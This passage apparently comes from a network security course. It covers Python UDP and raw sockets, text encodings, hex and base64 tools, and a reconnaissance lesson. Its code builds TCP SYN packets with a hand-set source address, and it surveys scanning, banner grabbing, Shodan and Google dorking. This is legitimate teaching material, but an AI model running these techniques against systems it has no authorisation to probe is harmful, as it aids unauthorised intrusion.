# the '' means to bind to any ip address on system

# Execute the command (a string) in a subshell.
os.system("clear")

print ("Awaiting UDP Messages")

# Receive data until canceled
while True:

    # Waits for a message to be sent across and breaks out the address
    # Receive data from the socket.
    # The return value is a bytes object representing the data received.
    # The maximum amount of data to be received at once is specified by bufsize
    # Waiting for data up to 1024 bytes.
    # The return value is a pair (bytes, address)
    # bytes is a bytes object representing the data received
    # address is the address of the socket sending the data

    data, addr = s.recvfrom(1024)

    address, port = addr

    # splits addr into 2 variables that is contained within it. Remote IP and remote port.

    print ("\nMessage Received: '%s'" % data.decode())
    print ("Sent by -", address, "port", port)

    # Send data to the socket. The socket must be connected to a remote socket.
    s.sendto(b"Message received by the UDP Message Server!", addr)


#!/usr/bin/python3

import socket
import os

PORT = 2222

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

s.bind(('', PORT))
# the '' means to bind to any ip address on system
Reference from the bind python page.
socket.bind using the tuple of the arguments self, address.
The specification of self is made by the ''.
address is the port number or variable to listen on.



# Execute the command (a string) in a subshell.
os.system("clear")
Reference from the os.system python page.
Execute the command (a string) in a subshell. This is implemented by calling the Standard C function system(), and has the same limitations. Changes to sys.stdin, etc. are not reflected in the environment of the executed command. If command generates any output, it will be sent to the interpreter standard output stream.
os.system("clear") will run the linux command clear to clear the screen.



print ("Awaiting UDP Messages")

# Receive data until canceled
while True:

    # Waits for a message to be sent across and breaks out the address
    # Receive data from the socket.
    # The return value is a bytes object representing the data received.
    # The maximum amount of data to be received at once is specified by bufsize
    # Waiting for data up to 1024 bytes.
    # The return value is a pair (bytes, address)
    # bytes is a bytes object representing the data received
    # address is the address of the socket sending the data

    data, addr = s.recvfrom(1024)

    address, port = addr

    # splits addr into 2 variables that is contained within it. Remote IP and remote port.

    print ("\nMessage Received: '%s'" % data.decode())
    print ("Sent by -", address, "port", port)

    # Send data to the socket. The socket must be connected to a remote socket.
    s.sendto(b"Message received by the UDP Message Server!", addr)
Reference from the socket.recvfrom python page.
Receive data from the socket. The return value is a pair (bytes, address) where bytes is a bytes object representing the data received and address is the address of the socket sending the data. See the Unix manual page recv(2) for the meaning of the optional argument flags; it defaults to zero. (The format of address depends on the address family — see above.)
data, addr = s.recvfrom(1024) where data is the variable to specifiy the data bytes received and addr is the variable to reference the remote socket tuple that sent the data. 1024 is the amount of memory (in bytes) assigned to receive the data.
address, port = addr pulls the ip(address) and the port(port) variables from the addr tuple.
Reference from the socket.sendto python page.
Send data to the socket. The socket should not be connected to a remote socket, since the destination socket is specified by address. The optional flags argument has the same meaning as for recv() above. Return the number of bytes sent.
s.sendto specifies that the system is to send the data into the socket (addr) and that it is not currently connected.


Resources


Instructor Note


5.6 Encoding and Decoding¶
Encoding = The process of taking bits and converting them using the specified cipher, such as ASCII, UTF-8, etc.

Most commonly used encoding today is UTF-8 which is compatible with unicode.
Decoding = The changing of the cipher used to change how the bits are displayed.

Documents that display improperly is typically the symptom of incorrect decoding selected by the program.
Encoding vs Encryption:

Encoding - is the process to transform data in such a format that it can be easily used by different types of systems.

Transforms data into another format using a scheme that is publicly available so that it can easily be reversed.
For maintaining data usability and uses schemes that are publicly available.
Examples: HTML Encoding, URL Encoding, Unicode Encoding, Base64 Encoding Hex Encoding, ASCII Encoding, base64 Encoding.
Encryption - is a process used to convert simple readable data known as plain text to unreadable data known as ciphertext which can only be converted to plain text if the user knows the encryption key.

Transforms data into another format in such a way that only specific individual(s) can reverse the transformation.
Uses publicly available methods but requires private "keys" to perform the transformation
For maintaining data confidentiality and thus the ability to reverse the transformation (keys) are limited to certain people.
Examples: Blowfish (symmetrical) RSA (asymmetrical),AES (symmetrical),ECC (namely ed25519) (asymmetric),Chacha/Salsa (symmetric).
Note: Asymmetric is slow but good for establishing a trusted connection. Symmetric has a shared key and is faster.
Protocols often use asymmetric to transfer symmetric key.


Examples of character encoding schemes:
ASCII (American Standard Code for Information Interchange): One of the oldest and most basic character encoding standards. It uses 7 bits to represent characters, allowing for 128 unique characters, including letters, numbers, punctuation, and control characters.
Unicode: A character encoding standard that aims to represent every character from every language. Unicode assigns a unique number, called a code point, to each character. It supports various encoding schemes, including UTF-8, UTF-16, and UTF-32.
UTF-8: Variable-width encoding scheme where each character is represented by 1 to 4 bytes. It's widely used on the internet because it's backward compatible with ASCII.
UTF-7: A variable-width character encoding that's designed to be more compact than UTF-8 for encoding Unicode text in environments that may restrict the use of 8-bit characters.
UTF-16: Fixed-width encoding scheme where each character is represented by either 2 or 4 bytes. It's commonly used in programming languages and operating systems.
UTF-32: Fixed-width encoding scheme where each character is represented by exactly 4 bytes. It's less commonly used due to its higher memory usage.
ISO-8859: A series of character encoding standards developed by the International Organization for Standardization (ISO). Each part of the ISO-8859 series is designed to support specific languages or groups of languages. For example, ISO-8859-1 is designed for Western European languages.
ISO-8859-15 (Latin-9): An extension of ISO-8859-1 that adds support for additional characters used in Western European languages, such as the Euro sign (€) and French and Finnish letters.
ISO-2022-JP: An extension of ISO-2022 that defines methods for encoding Japanese text specifically for the Japanese market.
ISO-8859-7 (Latin/Greek): A character encoding standard for the Greek alphabet, based on ISO-8859-1 but with Greek letters replacing certain Latin letters.
ISO-8859-8 (Latin/Hebrew): A character encoding standard for the Hebrew alphabet, based on ISO-8859-1 but with Hebrew letters replacing certain Latin letters.
ISO-8859-5 (Latin/Cyrillic): A character encoding standard for the Cyrillic alphabet, based on ISO-8859-1 but with Cyrillic letters replacing certain Latin letters.
ISO-8859-9 (Latin-5): A character encoding standard for the Turkish alphabet, based on ISO-8859-1 but with Turkish-specific letters replacing certain Latin letters.
ISO-8859-11 (Latin/Thai): A character encoding standard for the Thai alphabet, based on ISO-8859-1 but with Thai letters replacing certain Latin letters.
ISO-8859-16 (Latin-10): An extension of ISO-8859-1 that adds support for additional characters used in various European languages, including Romanian and Albanian.
TIS-620: A character encoding standard for the Thai alphabet, primarily used in Thailand.
ISCII (Indian Script Code for Information Interchange): A character encoding standard for representing various Indic scripts used in languages of India.
EBCDIC (Extended Binary Coded Decimal Interchange Code): A character encoding standard primarily used on IBM mainframe computers. It's different from ASCII and Unicode and was historically used in IBM systems.
Morse Code: A method of encoding text characters as sequences of two different signal durations, called dots and dashes or dits and dahs. It's mainly used in telecommunication.
Windows-1252 (CP-1252): An extension of ASCII used by Microsoft Windows to support additional characters for Western European languages. It's similar to ISO-8859-1 but includes additional characters in the 0x80 to 0x9F range.
Shift JIS: A character encoding used for Japanese text. It's a variable-width encoding where most characters are represented by two bytes, but some characters require three bytes.
BIG5: A character encoding used for traditional Chinese characters, primarily in Taiwan, Hong Kong, and Macau. It's a variable-width encoding with most characters represented by two bytes.
GB2312 and GBK: Character encodings used for simplified Chinese characters. GB2312 is an older standard, while GBK is an extension that includes additional characters. Both are widely used in mainland China.
KOI8-R and KOI8-U: Character encodings used for Russian text. KOI8-R is for Russian, while KOI8-U extends it to support Ukrainian characters.
ISO-2022: A character encoding standard that defines methods for encoding character sets into bit sequences. It's often used for encoding Japanese text.
Latin-1 (ISO-8859-1): A character encoding standard for Western European languages. It's a single-byte encoding and is part of the ISO/IEC 8859 series.
IBM Code Page 437: An extended ASCII character set used by early IBM PCs and compatible systems. It includes special characters, symbols, and box-drawing characters.
MacRoman: A character encoding used on older Macintosh computers. It's similar to ISO-8859-1 but includes additional characters in the 0x80 to 0x9F range.


Resources


Instructor Note
5.6.1 HEX Encoding/Decoding¶
xxd: creates a hex dump of a given file or standard input. It can also convert a hex dump back to its original binary form.

xxd - MAN XXD, XXD - How to Forge, XXD - Tutorialspoint

Options:

-r | -revert - reverse operation.
-p - output in postscript continuous hexdump style. Also known as plain hexdump style.
Examples:

Encode file to Hex and display to screen

xxd file.txt
Encode file to Hex and save to new file

xxd {options} infile (outfile)
xxd file.txt hex-file.txt
Decode file from Hex and save to new file

xxd -r {options} infile (outfile)
xxd -r hex-file.txt unhex-file.txt
Encode ASCII text to Hex and revert

echo "Message" | xxd -p
Decode ASCII text from Hex

echo "68656c6c6f0a" | xxd -r -p
HEX encoding using Python


import binascii

message = b'Message'
hidden_msg = binascii.hexlify(message)
HEX decoding using Python

new_msg = binascii.unhexlify(hidden_msg)


Resources


Instructor Note
5.6.2 BASE64 Encoding/Decoding¶
base64: tool can encode and decode file or input to/from base64 character encoding.

base64 - MAN BASE64

Endcode ASCII text to base64


echo "convert me" | base64
Y29udmVydCBtZQo=
Decode the base64 back to ASCII


echo "Y29udmVydCBtZQo=" | base64 --decode
convert me
Encode file contents to base64 then save to file


base64 file.txt > file-encoded.txt
Decode file contents from base64 back to original format


base64 -d file-encoded.txt > file-decoded.txt
BASE64 encoding using Python


import base64

message = b'Message'
hidden_msg = base64.b64encode(message)
BASE64 decoding using Python


new_msg = base64.b64decode(hidden_msg)


Resources


Instructor Note


5.6.3 Tools¶
Web browsers – most modern web browsers feature automatic character encoding detection.

iconv – program and standardized API to convert encodings

luit – program that converts encoding of input and output to programs running interactively convert_encoding.py – Python based utility to convert text files between arbitrary encodings and line endings

chardet – This is a translation of the Mozilla automatic-encoding-detection code into the Python computer language. The newer versions of the Unix file command attempt to do a basic detection of character encoding (also available on Cygwin).



Resources


Instructor Note


5.7 Demonstration of creating Raw Sockets¶
We will now bring the discussion to IPv4 raw sockets. As previously stated, raw sockets usually include headers for each layer that we are attempting to send unlike the stream and datagram sockets, which rely on encapsulation and decapsulation to provide only what is necessary. This means that we will be building out each of the headers and including data as needed.



Resources


Instructor Note


5.7.1 IP RAW Client¶
IPv4 RAW Socket Code


In order to properly set up a raw socket and set the packet structure out, we should consult the RFC for the header we are going to be looking at.

RFCs, or Requests for Comments, contain technical and organizational documents about the Internet, including specifications and policy documents. RFCs cover many aspects of computer networking, including protocols, procedures, and concepts.
Since we will need to build so much out for raw sockets, it is recommended to perform exception handling. To do so, we will need to discuss error / exception handling little bit. Reference - Python Errors and Python Exceptions.

Errors are considered exceptions in python, and can either break the program, or just make it not work as intended. This can happen if you have a user input a number, but they instead provide a character or string.

The way we will try to avoid those errors is by handling exceptions using try and except for the type of error. Here is an example of error handling for an IPv4 raw socket:


# For building the socket
import socket

# For system level commands
import sys

# For establishing the packet structure (Used later on), this will allow direct access to the methods and functions in the struct module
from struct import *

# Create a raw socket.
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
except socket.error as msg:
    print(msg)
    sys.exit()
The above will attempt to build a socket with s as the variable, using AF_INET as the family, SOCK_RAW as the type, and IPPROTO_RAW as the proto arguments. Note - this will not actually attempt to do anything until we provide more information later on.

0 or IPPROTO_TCP for STREAM (man tcp(7)) and 0 or IPPROTO_UDP for DGRAM (man udp(7)). For SOCK_RAW you may specify a valid IANA IP protocol defined in RFC 1700 assigned numbers.
IPPROTO_IP creates a socket that sends/receives raw data for IPv4-based protocols (TCP, UDP, etc). It will handle the IP headers for you, but you are responsible for processing/creating additional protocol data inside the IP payload.
IPPROTO_RAW creates a socket that sends/receives raw data for any kind of protocol. It will not handle any headers for you, you are responsible for processing/creating all payload data, including IP and additional headers. (man raw(7))
If the socket fails to build, the error will be placed in the variable msg, and prints it to the screen.

When the print finishes, sys.exit() will exit the program without needing to manually exit.

Now that the socket is getting created with exception handling, we will go ahead and lay out the packet structure using our knowledge of headers and eventually the struct module. Reference - * Struct Module

First, we need to build out the empty packet and lay out the fields in the IPv4 header. Try to keep values at a minimum of 1 byte due to sizing in the struct library.

To do this, you should refer to the RFC, Section 3 - Specification, (* RFC 791) for the IPv4 header to properly lay out the format.

Here is an example:


packet = ''

src_ip = "127.0.0.1"
dst_ip = "127.0.0.1"

# Lets add the IPv4 header information
ip_ver_ihl = 69  # This is putting the decimal conversion of 0x45 for Version and Internet Header Length
ip_tos = 0           # This combines the DSCP and ECN fields
ip_len = 0           # The kernel will fill in the actually length of the packet
ip_id = 12345        # This sets the IP Identification for the packet
ip_frag = 0          # This sets fragmentation to off
ip_ttl = 64          # This determines the TTL of the packet when leaving the machine
ip_proto = 16        # This sets the IP protocol to 16 (Chaos). If this was 6 (TCP) or 17 (UDP) additional headers would be required
ip_check = 0         # The kernel will fill in the checksum for the packet
ip_srcadd = socket.inet_aton(src_ip)  # inet_aton(string) will convert an IP address to a 32 bit binary number
ip_dstadd = socket.inet_aton(dst_ip)  # inet_aton(string) will convert an IP address to a 32 bit binary number
Here we defined each of the ipv4 header fields and their values.

We defined scr_ip and dst_ip variables but they are currently stored as string values. To convert them to 32-bit binary numbers we use the inet_aton() function.

Now that we have layed out the header fields, we are going to use the function pack(format, var1, var2, ...) from the struct module. This will allow us to format the packet in the correct order for field alignment. Format will start with "!" for network (big-endian), and will be followed by byte sizes in quotes which corresponds with the fields we apply as variables in order. Here is an example of packing the header:


ip_header = pack('!BBHHHBBH4s4s' , ip_ver_ihl, ip_tos, ip_len, ip_id, ip_frag, ip_ttl, ip_proto, ip_check, ip_srcadd, ip_dstadd)
To determine the format sizes, refer to * Struct Module - Format Characters. Notice that the smallest size allocated in this way is 1 byte, which is why we combined the two nibbles Version and IHL. Here is a quick reference:

B = 1 byte (Byte)
H = 2 bytes (Half Word)
4s = 4 bytes (Word - Converted from string to binary)
Next we will add a message to go with the packet, and send it. Here is an example:


message = b'This is a message'
packet = ip_header + message

# Send the packet
s.sendto(packet, (dst_ip, 0))
Above you see that the bytes-like object message is added to the ip_header variable.
Finally, we call the socket object sendto([bytes,[address(hostaddr, port)]]) (since we did not establish a connection prior) where bytes is the combination of ip_header and message variables, and address is the tuple for host address and port. Since we aren't going to a specific port, that is going to stay 0.
Now you can watch wireshark or tcpdump -X to see your packet go across with your message appended. You should get an icmp response saying that port is not open.



Resources


Instructor Note


5.7.2 TCP Raw Client¶
TCP RAW Socket Code


Raw sockets can tie in additional headers, such as TCP or UDP, which requires setting up those headers in a similar way as the IP header. For this, we start out the raw socket just like we did previously:


# For building the socket
import socket

# For system level commands
import sys

# For doing an array in the TCP checksum
import array

# For establishing the packet structure (Used later on), this will allow direct access to the methods and functions in the struct module
from struct import *

# Create a raw socket.
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
except socket.error as msg:
    print(msg)
    sys.exit()

packet = ''

src_ip = "10.10.0.40"
dst_ip = "172.16.82.106"

# Lets add the IPv4 header information
ip_ver_ihl = 69                       # This is putting the decimal conversion of 0x45 for Version and Internet Header Length
ip_tos = 0                            # This combines the DSCP and ECN fields
ip_len = 0                            # The kernel will fill in the actually length of the packet
ip_id = 12345                         # This sets the IP Identification for the packet
ip_frag = 0                           # This sets fragmentation to off
ip_ttl = 64                           # This determines the TTL of the packet when leaving the machine
ip_proto = 6                          # This sets the IP protocol to 6 (TCP) or 11 (UDP) (reference IANA)
ip_check = 0                          # The kernel will fill in the checksum for the packet
ip_srcadd = socket.inet_aton(src_ip)  # inet_aton(string) will convert an IP address to a 32 bit binary number
ip_dstadd = socket.inet_aton(dst_ip)  # inet_aton(string) will convert an IP address to a 32 bit binary number

ip_header = pack('!BBHHHBBH4s4s' , ip_ver_ihl, ip_tos, ip_len, ip_id, ip_frag, ip_ttl, ip_proto, ip_check, ip_srcadd, ip_dstadd)
Here we just change the IP protocol to 6 making it TCP, making the tcp header a requirement.
Then we will move the packet sending portion to the bottom and add our tcp headers by following the RFC, Section 3.1 - Header format (* RFC 793). Here is an example:

# Tcp header fields
tcp_src = 54321                       # source port
tcp_dst = 7777                        # destination port
tcp_seq = 454                         # sequence number
tcp_ack_seq = 0                       # tcp ack sequence number
tcp_data_off = 5                      # data offset specifying the size of tcp header * 4 which is 20
tcp_reserve = 0                       # the 3 reserve bits + ns flag in reserve field
tcp_flags = 0                         # tcp flags field before the bits are turned on
tcp_win = 65535                       # maximum allowed window size reordered to network order
tcp_chk = 0                           # tcp checksum which will be calculated later on
tcp_urg_ptr = 0                       # urgent pointer only if urg flag is set

# Combine the left shifted 4 bit tcp offset and the reserve field
tcp_off_res = (tcp_data_off << 4) + tcp_reserve
As with the IPv4 header, we need to create the fields necessary to build the TCP header.
The tcp_data_off and tcp_reserve variables are separated at first but combined by putting the value of the field starting 4 bits over. This means instead of the binary values looking like "128 64 32 16 8 4 2 1", you now have binary values "8 4 2 1" starting at the 4th bit from right to left, just like hex. This process is completely optional. We could use tcp_off_res = 80 to avoid the combining of the 2 fields. This would limit our capabilities to adjust these variables independently.
The tcp_flags variable is set to 0 here because we will be using that variable later and it needs to start with a value.
Now we will define the tcp flags by bit location and combine them. Here is an example:

# Tcp flags by bit starting from right to left
tcp_fin = 0                           # Finished
tcp_syn = 1                           # Synchronization
tcp_rst = 0                           # Reset
tcp_psh = 0                           # Push
tcp_ack = 0                           # Acknowledgment
tcp_urg = 0                           # Urgent
tcp_ece = 0                           # Explicit Congestion Notification Echo
tcp_cwr = 0                           # Congestion Window Reduced

# Combine the tcp flags by left shifting the bit locations and adding the bits together
tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5) + (tcp_ece << 6) + (tcp_cwr << 7)
As you can see, we again left shifted the bit locations from right to left for the tcp flags in order to have the bits combine if they are on. This process is optional. We could use tcp_flags = 2 to get our value to avoid combining all the field individually. This would limit our capabilities to adjust these variables independently.
The next thing we have to do is pack the tcp header with the struct module.

# The ! in the pack format string means network order
tcp_hdr = pack('!HHLLBBHHH', tcp_src, tcp_dst, tcp_seq, tcp_ack_seq, tcp_off_res, tcp_flags, tcp_win, tcp_chk, tcp_urg_ptr)
To determine the format sizes, refer to * Struct Module - Format Characters. Here is a quick reference:

B = 1 byte (Byte)
H = 2 bytes (Half Word)
L = 4 bytes (32 bit Word as an integer)
Now you can add a variable for user text. Here is an example:


user_data = b'Hello! Is this hidden?'
Now that we have all of the fields created and packed, we need to build a checksum mechanism in order to properly calculate the checksum.
To do this, we have to understand how a tcp checksum is calculated. Reference - * TCP Checksum Calculation and the TCP Pseudo Header

To calculate the TCP segment header’s checksum field, a 12-byte TCP pseudo header is constructed and placed before the TCP segment.
The TCP pseudo header consists of source address (4 bytes from IP header), destination address (4 bytes from IP header), reserved (1 byte), protocol (1 byte from IP header), tcp segment length (2 bytes computed from tcp header and data)
Once this 96-bit header has been formed, it is placed in a buffer, following which the TCP segment itself is placed. Then, the checksum is computed over the entire set of data (pseudo header plus TCP segment). The value of the checksum is placed into the Checksum field of the TCP header, and the pseudo header is discarded—it is not an actual part of the TCP segment and is not transmitted.
Now that we have an idea of how the tcp checksum is run, we need to build the pseudo header. Here is an example:


# Pseudo header fields
src_address = socket.inet_aton(src_ip)
dst_address = socket.inet_aton(dst_ip)
reserved = 0
protocol = socket.IPPROTO_TCP
tcp_length = len(tcp_hdr) + len(user_data)
After the variables are created for the pseudo header, we need to pack the header in the proper format using the order and byte values previously stated. Here is an example:

# Pack the pseudo header and combine with user data
ps_hdr = pack('!4s4sBBH', src_address, dst_address, reserved, protocol, tcp_length)
ps_hdr = ps_hdr + tcp_hdr + user_data
As you can see, pack from the struct module is setting the format to network order with ! and is matching the byte sizes we stated above before putting the variables in order.
Now that the pseudo header fields have been packed, we will have to create a function to calculate the checksum before we can call on it. Here is an example:

def checksum(data):
        if len(data) % 2 != 0:
                data += b'\0'
        res = sum(array.array("H", data))
        res = (res >> 16) + (res & 0xffff)
        res += res >> 16
        return (~res) & 0xffff
The checksum is evaluating on each part of the combined pseudo header, tcp header, and user data after it is converted into binary.

Every 32 bit word is split into 16 bits and the binary values are added together.
Once this is complete, you have to invert the binary value to get the ones complement.
Next we will call the checksum function with the combined pseudo header as the object and repack the header with . Here is an example:


tcp_chk = checksum(ps_hdr)

# Pack the tcp header to fill in the correct checksum - remember checksum is NOT in network byte order
tcp_hdr = pack('!HHLLBBH', tcp_src, tcp_dst, tcp_seq, tcp_ack_seq, tcp_off_res, tcp_flags, tcp_win) + pack('H', tcp_chk) + pack('!H', tcp_urg_ptr)
Then you can combine the headers with user data and send the packet to the destination as we have previously.

# Combine all of the headers and the user data
packet = ip_header + tcp_hdr + user_data

# Send the packet
s.sendto(packet, (dst_ip, 0))
Finally, we call the socket object sendto([bytes,[address(hostaddr, port)]]) where bytes is the combination of ip_header , tcp_hdr and user_data variables, and address is the tuple for host address and port. Since we aren't telling it to go to a specific port, but to rely on the packet information attached, the third variable in the tuple will stay 0.
Now you can watch wireshark or tcpdump -vX to see your packet go across with your message appended and the correct checksum. You should see the three-way handshake start with syn, then syn-ack, but close with a reset since we are not attempting to fully establish a connection.

Network Reconnaissance¶
Lesson Number: 112-CCTC18

Slides¶
Network Reconnaissance Slides
6.0 Outcomes:¶
Describe Methods Used for Passive External Discovery

Dig, Whois and Other Tools
Dig
Whois
Zone Transfer
Netcraft
Collect Historical Content
Google Searches
SHODAN
Passive OS Fingerprinting (p0f)
Describe Methods Used for Active External Discovery

Network Scanning and Banner Grabbing
PING
NMAP
Netcat
Curl and Wget
/dev/tcp
Describe Methods Used for Passive Internal Network Reconnaissance

Packet Sniffers
Native Host Tools
Describe Methods Used for Active Internal Network Reconnaissance

ARP Requests
Perform Network Forensics

Map a Network Through Correlation of Relevant Network Artifacts Gathered Through Reconaissance and Analysis
Understanding these cyber techniques is crucial for ethical hacking, penetration testing, and cybersecurity defense.

There are four general approaches to Network Reconnaissance; Passive External, Active External, Passive Internal, and Active Internal.

Passive external discovery methods help gather intelligence without alerting the target. Tools like Dig, Whois, and Zone Transfers provide insights into domain names, IP addresses, and DNS records, helping security professionals identify potential attack vectors. Netcraft reveals a website’s infrastructure and historical data, which can uncover vulnerabilities. Collecting historical content through sources like the Wayback Machine helps in analyzing previous security weaknesses or exposed data. Google Searches, especially through advanced operators (Google Dorking), can expose sensitive information unintentionally indexed online. SHODAN is a powerful tool for identifying exposed servers, webcams, and IoT devices with weak security settings. Passive OS fingerprinting (p0f) enables analysts to determine an operating system without actively probing it, reducing the risk of detection.

Active external discovery involves direct interaction with the target to gather intelligence. Network scanning and banner grabbing techniques using tools like PING, NMAP, Netcat, Curl, Wget, and /dev/tcp help identify live hosts, open ports, and running services. Banner grabbing extracts metadata from services, revealing software versions that may be outdated or vulnerable to exploits.

Within an internal network, passive reconnaissance involves monitoring traffic without actively probing systems. Packet sniffers like Wireshark allow cybersecurity professionals to capture and analyze network communication to detect security threats. Native host tools built into operating systems can be leveraged to gather local network details discreetly, avoiding detection by security monitoring systems.

Active internal network reconnaissance, such as ARP requests, helps map out devices on a network by identifying MAC addresses and IP assignments, allowing attackers or defenders to understand network topology. Finally, network forensics involves mapping a network by correlating artifacts collected through reconnaissance and analysis. This process is essential for understanding how an attacker navigated a network, detecting malicious activity, and strengthening security defenses. Mastering these techniques is vital for cybersecurity professionals to anticipate threats, conduct penetration testing, and enhance overall network security.



Resources


Instructor Note


6.1 Active vs Passive¶
Reconnaissance is the process of gathering information about a target system, network, or organization and is an essential step in both cybersecurity attacks and defensive strategies. It can be categorized into active and passive approaches, where active reconnaissance involves direct interaction with the target, and passive reconnaissance relies on gathering data without alerting the target.

Additionally, reconnaissance can be conducted internally, from within the organization's network, or externally, from an outsider's perspective. Understanding these concepts provides a foundation for exploring how attackers and defenders approach information gathering.



Resources


Instructor Note


6.1.1 Passive Reconnaissance¶
Passive recon - is when you gather information about a target without directly interacting with the target. In networking it means to gather information about a target without sending packets to the target. Target is not likely to generate logs or artifacts to inform them they are being targeted.

Publicly Available Information (PAI) / Open source intelligence (OSINT) to gather:

IP addresses
domain names
email addresses
names
hostnames
dns records
software running (to associate with CVE)
Using tools like:

Google Hacking (search engines)
Netcraft
Shodan
Social Media
DNS
On the offensive side, the client listens for beacons and other traffic sent periodically by a target. On the defensive side, passive scanning can be done using an IDS, it watches the network and look for irregular traffic or other indicators of compromise. A passive scan generally takes more time, since the client must listen and wait for traffic versus actively probing.

Publicly Available Information (PAI): Refers to data that is freely accessible to the public. This information can be found through various sources, both online and offline, and is not considered private or confidential.

Open Source Intelligence (OSINT): This involves gathering intelligence from publicly available sources. It involves collecting and analyzing data from publicly accessible resources such as websites, social media, public records, and other online repositories without directly interacting with or engaging the target systems.

OSINT sources can be divided up into six different categories of information flow:
Media:, print newspapers, magazines, radio, and television from across and between countries.
Internet, online publications, blogs, discussion groups, citizen media (i.e. - cell phone videos, and user created content), YouTube, and other social media websites (i.e. - Facebook, Twitter, Instagram, etc.). This source also outpaces a variety of other sources due to its timeliness and ease of access.
Public Government Data, public government reports, budgets, hearings, telephone directories, press conferences, websites, and speeches. Although this source comes from an official source they are publicly accessible and may be used openly and freely.
Professional and Academic Publications, information acquired from journals, conferences, symposia, academic papers, dissertations, and theses.
Commercial Data, commercial imagery, financial and industrial assessments, and databases.
Grey literature, technical reports, preprints, patents, working papers, business documents, unpublished works, and newsletters.
Network Traffic Analysis: Passive network traffic analysis involves monitoring network traffic passively to gather information about the target network. This can include analyzing network packets, monitoring DNS traffic, and observing patterns of communication to identify hosts, services, and potential vulnerabilities.

Domain Name System (DNS) Analysis: DNS reconnaissance involves gathering information about domain names, IP addresses, and other DNS records associated with the target organization. This can include querying DNS servers for information, performing zone transfers, and analyzing DNS cache data to gather intelligence about the target's infrastructure.

WHOIS Lookup: WHOIS is a protocol used to query databases of registered domain names and IP addresses. WHOIS lookup tools can be used to gather information about domain ownership, registration dates, contact information, and other details that may be useful for reconnaissance purposes.

Passive DNS Analysis: Passive DNS analysis involves collecting and analyzing historical DNS data to identify patterns of domain ownership, domain associations, and changes in DNS records over time. Passive DNS databases can be queried to gather intelligence about domain names, IP addresses, and hostnames associated with the target organization.

Google Dorking: Google Dorking (also known as Google hacking) involves using advanced search techniques and operators to uncover sensitive information, files, or vulnerabilities exposed on the internet. By crafting specific search queries, attackers can discover publicly accessible documents, directories, login pages, and other resources that may contain valuable information about the target.

Social engineering: can be a form of passive reconnaissance when attackers subtly manipulate people into revealing information without directly interacting with the target systems. This approach often involves analyzing publicly available information, such as social media profiles, forums, or company websites, to learn about employees, organizational structure, or internal processes. By studying human behavior and leveraging publicly accessible data, attackers can craft convincing pretexts or phishing attempts, laying the groundwork for more active exploitation without triggering suspicion.



Resources


Instructor Note


6.1.2 Active Reconnaissance¶
Active recon - is when you interact directly with a computer system in order to gather system specific information about the target. In networking it means to gather information about a target by sending packets to the target in order to solicit information. Target with potentially generate logs and create artifacts. The main drawback of active reconnaissance compared to passive reconnaissance is that direct interaction with the host has a chance of triggering the systems IDS/IPS and alerting people to your activity.

Used to find out information such as:

open/closed ports
OS of a machine
services running
banner grabbing
discovering new hosts
find vulnerable applications on a host
Using tools like:

Nmap
Ping
Traceroute
Netcat
Nessus
Nikto
Active scanning is the process of transmitting packets to a remote host and analyzing corresponding replies to locate and identify devices.

Port Scanning: This involves scanning the target system for open ports and services. Tools like Nmap are commonly used for this purpose. Knowing which ports are open can provide insight into the services running on the system and potential vulnerabilities.
Network Scanning: This involves scanning the target network for devices and their characteristics. Tools like NetScanTools or Angry IP Scanner can be used to identify hosts, their IP addresses, and other network information.
Vulnerability Scanning: This involves scanning for known vulnerabilities in the target system or network. Tools like Nessus or OpenVAS can automatically scan for vulnerabilities in systems and provide reports on potential weaknesses.
DNS Enumeration: This involves gathering information about the domain name system (DNS) of the target organization. Tools like nslookup or dig can be used to query DNS servers for information such as hostnames, IP addresses, and mail exchange (MX) records.
Web Application Scanning: This involves scanning web applications for vulnerabilities such as SQL injection, cross-site scripting (XSS), or directory traversal. Tools like Burp Suite or OWASP ZAP can be used to scan web applications for security flaws.
Social Engineering: While not strictly a technical method, social engineering involves manipulating individuals within the target organization to divulge sensitive information. This can include techniques such as phishing, pretexting, or impersonation.


Resources


Instructor Note


6.1.3 External Reconnaissance¶
External reconnaissance, also known as external scanning or external network reconnaissance, involves gathering information about a target network from outside the network perimeter.
This phase is typically the first step in a cyber attack or security assessment and is aimed at identifying potential entry points, vulnerabilities, and attack surfaces.
External reconnaissance is crucial for attackers seeking to gain initial access to a target network and for organizations conducting security assessments to identify and mitigate external threats.
This phase can be both Passive and Active:
Passive
PAI and OSINT collection
Active
Conducting ping and scans against the target's public facing IP addresses from remote.


Resources


Instructor Note


6.1.4 Internal Reconnaissance¶
Internal reconnaissance, also known as internal scanning or internal network reconnaissance, involves gathering information about a target network from within the network itself.
This phase typically occurs after an attacker has gained some level of access to the internal network, either through social engineering, phishing, malware, or exploiting vulnerabilities in external-facing systems.
Internal reconnaissance is crucial for attackers seeking to escalate privileges, move laterally within the network, and identify high-value targets.
It's also an essential step in red teaming exercises and security assessments conducted by organizations to evaluate the security posture of their internal networks.
This phase can be both Passive and Active:
Passive
Collecting available information from an internal system or network.
Active
Conducting ping and scans against the target's internal facing IP addresses from local.


Resources


Instructor Note


6.1.5 Reconnaissance Chart¶




Method	External	Internal	Passive	Active
PAI/OSINT	x		x	
DNS Lookups (DIG)	x		x	
Whois	x		x	
Job site listings	x		x	
Shodan	x		x	
Packet Sniffing		x	x	
ARP Cache		x	x	
IP Address		x	x	
DNS Queries		x	x	
Running Services		x	x	
ARP Requests		x		x
Ping scans	x	x		x
Open Ports	x	x		x
NMAP scans	x	x		x
Port Scans	x	x		x
Network Scanning	x	x		x
OS Identification	x	x	x	x


Resources


Instructor Note


6.2 Blue vs Gray vs Red Space¶
In network reconnaissance and cybersecurity, the terms Blue, Gray, and Red Spaces represent different environments or domains that relate to how information is gathered, protected, or attacked. These spaces are central concepts in understanding how both defenders (Blue Teams) and attackers (Red Teams) interact with networks, systems, and the public domain during security assessments.

BGR-space

Blue Space (Friendly Space)

Definition: The Blue Space is your trusted network or the environment you control. This could be your organization's internal network or the systems, servers, and infrastructure you are responsible for protecting.
Role in Reconnaissance: When conducting reconnaissance from a Blue Space, you are operating within a trusted environment, meaning you have access to resources that allow you to perform defensive operations (e.g., vulnerability scanning, network monitoring, or internal threat hunting) without the risk of breaching security protocols.
